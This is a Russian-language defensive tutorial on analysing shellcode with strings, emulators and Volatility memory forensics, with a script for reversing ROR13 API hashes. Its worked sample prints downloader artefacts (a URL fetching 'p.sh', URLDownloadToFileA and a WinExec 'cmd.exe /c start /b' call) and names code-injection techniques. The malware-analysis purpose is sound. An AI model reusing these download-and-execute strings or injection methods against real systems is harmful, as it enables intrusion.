## Вопрос, с которого всё начинается

В памяти процесса ты нашёл область байтов, которая не похожа на данные и начинает
выполняться. Это **shellcode** — небольшой позиционно-независимый код, который выполняет
полезную нагрузку. Как его извлечь и понять, что он делает, не запуская?

## Наш пример: блок shellcode

Shellcode — это машинный код (обычно x86/x64), который должен работать по любому адресу,
поэтому он **позиционно-независимый** (PIC): не использует абсолютные адреса, а находит
функции динамически. Начнём с извлечения и посмотрим на строки.

## Шаг 1: откуда берётся shellcode

Shellcode появляется в нескольких местах:

- внутри эксплойта (переполнение буфера, use-after-free);
- как payload после **распаковки** упакованного файла;
- в памяти процесса, куда его впрыснули (injection);
- в сетевом трафике (загрузка второй стадии).

Найти его можно в дампе памяти (Volatility, `malfind`), в образе файла (после unpacking) или
в перехваченном трафике.

## Шаг 2: почему нельзя просто запустить

Shellcode рассчитан на конкретную среду: он ищет `kernel32.dll` в памяти, вызывает функции
по хешу или имени. Запустить его «как есть» на другой системе опасно и ненадёжно. Поэтому
используют **эмуляцию** — пошаговое исполнение в контролируемом интерпретаторе, который
записывает вызовы, но не выполняет реальные действия.

## Шаг 3: извлечение строк

Первый шаг — вытащить печатаемые строки:

```
$ strings -n 6 shellcode.bin
kernel32.dll
LoadLibraryA
WinExec
urlmon.dll
URLDownloadToFileA
http://198.51.100.9/p.sh
cmd.exe /c start /b
```

Уже из этого видно сценарий: shellcode загружает `urlmon.dll`, вызывает
`URLDownloadToFileA` (скачать файл), затем `WinExec` для запуска. То есть поведение —
«скачай и запусти» (downloader). Строки часто раскрывают намерение без дизассемблирования.

## Шаг 4: эмуляция

Для точного анализа используют эмуляторы (`scdbg`, `Speakeasy`, `Qiling`). Они выполняют
инструкции и логируют вызовы API:

```
$ scdbg -f shellcode.bin
...
CreateFileA("C:\\Users\\...\\p.sh")
URLDownloadToFileA(...)
WinExec("cmd.exe /c start /b p.sh")
```

Эмулятор показывает последовательность вызовов и аргументы. Это безопасно: реальные файлы
не создаются, сеть не используется (можно подменить функции заглушками). Так получают
поведенческий отчёт по shellcode.

## Шаг 5: как быть с обфускацией

Продвинутый shellcode шифрует строки и вычисляет адреса функций по хешам, чтобы избежать
подозрительных строк. Тогда приёмы такие: искать таблицы хешей, точки вызова API по
регистру, расшифровывать строки эмуляцией (эмулятор сам подставит результат), использовать
`Speakeasy`/`Qiling` для распаковки. Часто после эмуляции строки и API «проявляются» сами.

## Что мы теперь знаем

- Shellcode — позиционно-независимый машинный код полезной нагрузки.
- Он появляется в эксплойтах, после unpacking, при injection, в трафике.
- `strings` даёт быстрый ответ о намерении (скачать/запустить).
- Эмуляторы (`scdbg`, `Speakeasy`, `Qiling`) безопасно логируют вызовы API.
- Обфускация обходится эмуляцией и расшифровкой строк.

## Как shellcode находит API

Shellcode не может просто вызвать функцию по имени — у него нет таблицы импорта, как у
обычного файла. Поэтому он находит функции динамически. Два основных приёма:

**PEB walking.** В Windows структура процесса (PEB — Process Environment Block) содержит
список загруженных модулей. Shellcode идёт по этому списку, находит `kernel32.dll`, затем
через его таблицу экспорта — нужные функции (`LoadLibraryA`, `GetProcAddress`). Так он
получает адреса API без жёсткой привязки к версии Windows.

**API hashing.** Чтобы не оставлять подозрительных строк с именами функций, shellcode
хранит **хеши** имён (часто CRC32) и сравнивает их с хешами экспортов. Это классика
Metasploit-шеллкодов. Для анализа такие хеши можно «отреверсить»: посчитать хеши известных
экспортов и сопоставить — так восстанавливают, какие функции вызываются.

Понимание этих приёмов объясняет, почему `strings` иногда не показывает имён API: их там
просто нет, есть только хеши.

## Способы инъекции shellcode в память

Чтобы shellcode выполнился, его нужно поместить в память и передать управление. Типовые
техники:

- **CreateRemoteThread** — создание потока в чужом процессе;
- **QueueUserAPC** — постановка APC в очередь потока;
- **process hollowing** — замена содержимого легитимного процесса;
- **alloc + write + execute** — `VirtualAlloc`/`WriteProcessMemory` + передача управления.

Каждая техника оставляет след в памяти и в вызовах API, поэтому при анализе дампа ищут
исполняемые области, не привязанные к файлу на диске (`malfind` в Volatility), и сопоставляют
их с перехваченными API.

## Пошаговая эмуляция

Эмуляция выполняется так: загружаешь shellcode в эмулятор, задаёшь точку входа, включаешь
логирование API, запускаешь. Эмулятор пошагово исполняет инструкции, перехватывает вызовы
и записывает аргументы. По ходу можно остановиться на интересном вызове и посмотреть
регистры и память. Ключевое преимущество — **безопасность**: реальные файлы не создаются,
сеть подменяется заглушками. Для упакованного shellcode эмуляция сама распаковывает код в
памяти, и строки/API «проявляются».

## Практический сценарий

По нашему образцу: извлекли shellcode, прогнали `strings` — увидели `kernel32.dll`,
`URLDownloadToFileA`, `WinExec`, URL. Это уже гипотеза «downloader». Запустили эмулятор —
он подтвердил: сначала `URLDownloadToFileA` скачивает `p.sh`, затем `WinExec` запускает
`cmd.exe /c start /b`. Записали IOC (URL, команду). Так за несколько минут получили
поведенческий отчёт без запуска вредоноса.

## Инструменты и ограничения

Инструменты: `scdbg` (быстрая эмуляция), `Speakeasy` (Windows API эмуляция),
`Qiling` (полная эмуляция ОС), дизассемблеры (IDA, Ghidra, radare2) для ручного разбора.
Ограничения: эмулятор может не поддерживать редкие инструкции или сложные вызовы; shellcode
может проверять окружение и «замолкать»; обфускация требует ручной расшифровки. Поэтому
эмуляцию дополняют дизассемблированием и, при возможности, отладкой в изолированной среде.

## Связка с memory forensics

Shellcode чаще всего живёт в памяти, поэтому его анализ тесно связан с форензикой памяти.
В дампе процесса ищут исполняемые области, не принадлежащие ни одному файлу на диске
(признак инъекции), затем извлекают их содержимое и анализируют как shellcode. Инструменты
памяти (Volatility с плагинами `malfind`, `yarascan`) помогают найти кандидатов, а
эмулятор — понять поведение. Если помимо shellcode в памяти остались строки (URL, имена
файлов), они дают IOC без эмуляции. Поэтому при инциденте с инъекцией всегда снимай дамп
памяти до перезагрузки: после неё shellcode исчезнет.

## Практический чек-лист

- Извлеки область кода (из памяти, файла или трафика) и посчитай её хеш.
- Прогони `strings` — ищи имена API, URL, команды, пути.
- Определи архитектуру (x86/x64/ARM) и точку входа.
- Прогони через эмулятор с логированием API.
- Восстанови поведение: скачивание, запуск, персистентность.
- Выпиши IOC и сопоставь с другими артефактами инцидента.
- Если строк нет — ищи API-хеши и расшифровывай эмуляцией.

## Как отличить shellcode от обычного кода

Не любой фрагмент машинного кода — shellcode. Признаки, помогающие его опознать: код
независим от адреса (использует `call/pop` для получения своего положения), ищет API
динамически (перебор PEB или хеши), содержит строки с именами библиотек и функций, имеет
маленький размер и часто заканчивается переходом в скачанный или расшифрованный payload.
В дампе памяти shellcode лежит в исполняемой области, которой нет соответствия на диске.

Дополнительный признак — **вызовы по необычным адресам**: если поток исполняется в памяти,
выделенной не под модуль, это инъекция. Сопоставление списка загруженных модулей процесса
с его картой памяти показывает такие «лишние» области. Именно там и прячется shellcode, и
именно его извлекают для эмуляции.

## Итог: почему shellcode анализируют эмуляцией

Shellcode — это код без окружения: он сам находит API, сам распаковывает себя, сам решает,
что делать дальше. Запускать его «вживую» опасно и бессмысленно, потому что среда не та.
Эмуляция даёт безопасный, воспроизводимый и логируемый прогон: ты видишь каждый вызов и
можешь остановиться в любой момент. Именно поэтому эмуляция — базовый инструмент анализа
shellcode, а `strings` и дизассемблирование — её дополнение.

Наконец, запомни порядок: извлечь → распознать → эмулировать → задокументировать. Любой шаг
можно уточнить, но пропускать его нельзя: без извлечения нечего анализировать, без
распознавания легко принять за shellcode обычный код, без эмуляции не будет поведения, а без
документирования выводы не примут.

## Расшифровка API-хешей на практике

Когда shellcode прячет имена функций за хешами (частый приём Metasploit), `strings` не покажет
ничего полезного. Хеши восстанавливают сопоставлением: считаешь хеш для каждого экспорта
`kernel32.dll`/`ntdll.dll` и ищешь совпадение со значением в коде.

```python
import pefile, binascii
# типичный хеш Metasploit — ROR13 (или CRC32)
def ror13(s):
    h = 0
    for c in s.encode():
        h = ((h >> 13) | (h << (32-13))) & 0xffffffff
        h = (h + c) & 0xffffffff
    return h
pe = pefile.PE("kernel32.dll")
for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
    if exp.name:
        print(hex(ror13(exp.name.decode())), exp.name.decode())
```

Найденные в дампе константы (`0xEC0E4E8E` и т. п.) сверяют с этой таблицей — так
восстанавливают, какие API вызывает shellcode. Полезно помнить оба популярных алгоритма:
**ROR13** (Metasploit) и **CRC32** (Cobalt Strike и др.). Без этого шага обфусцированный
shellcode выглядит «немым», хотя на самом деле просто замаскирован.

## Извлечение shellcode из дампа памяти пошагово

Практический порядок работы с дампом, в котором подозревается инъекция:

```
$ volatility -f mem.raw --profile=Win10x64 malfind   # найти исполняемые области без файла
$ volatility -f mem.raw --profile=Win10x64 malfind -D dump/   # выгрузить найденные области
$ yara -r shellcode_rules.yar dump/                   # просканировать выгруженное
$ scdbg -f dump/process.0x1a0000.0x8000.dmp           # эмулировать
```

`malfind` ищет страницы с правами **execute**, не привязанные к модулю на диске (нет записи
в списке загруженных DLL) — это и есть кандидаты на shellcode. Выгруженные области содержат
байты, включая возможный **MZ/PE-заголовок** второй стадии: если он есть, образец можно
разобрать как обычный PE. Если нет — эмулировать как shellcode. Дамп памяти снимают **до**
перезагрузки: после неё инъекция исчезнет вместе с процессом.

## Ограничения эмуляторов и когда нужен отладчик

Эмуляция мощна, но не всесильна:

- **Неподдерживаемые инструкции.** Эмулятор может споткнуться на новых AVX/специфичных
  инструкциях и остановиться — тогда участок разбирают дизассемблером вручную.
- **Анти-эмуляция.** Shellcode проверяет окружение (наличие отладочных артефактов, тайминги,
  результат «неожиданных» API) и «замолкает». Признак — эмуляция идёт «не туда» или быстро
  завершается.
- **Внешние зависимости.** Если payload ждёт сеть или другой процесс, эмулятор подменяет
  вызовы заглушками, и полной картины не будет.

В таких случаях эмуляцию дополняют **отладкой в изолированной ВМ** (снимок, без сети) или
динамическим анализом под песочницей. Правило простое: эмуляция даёт 80 % понимания быстро и
безопасно, а оставшиеся 20 % (сложные/анти-эмуляционные образцы) добирают отладкой — но уже
в контролируемой среде.
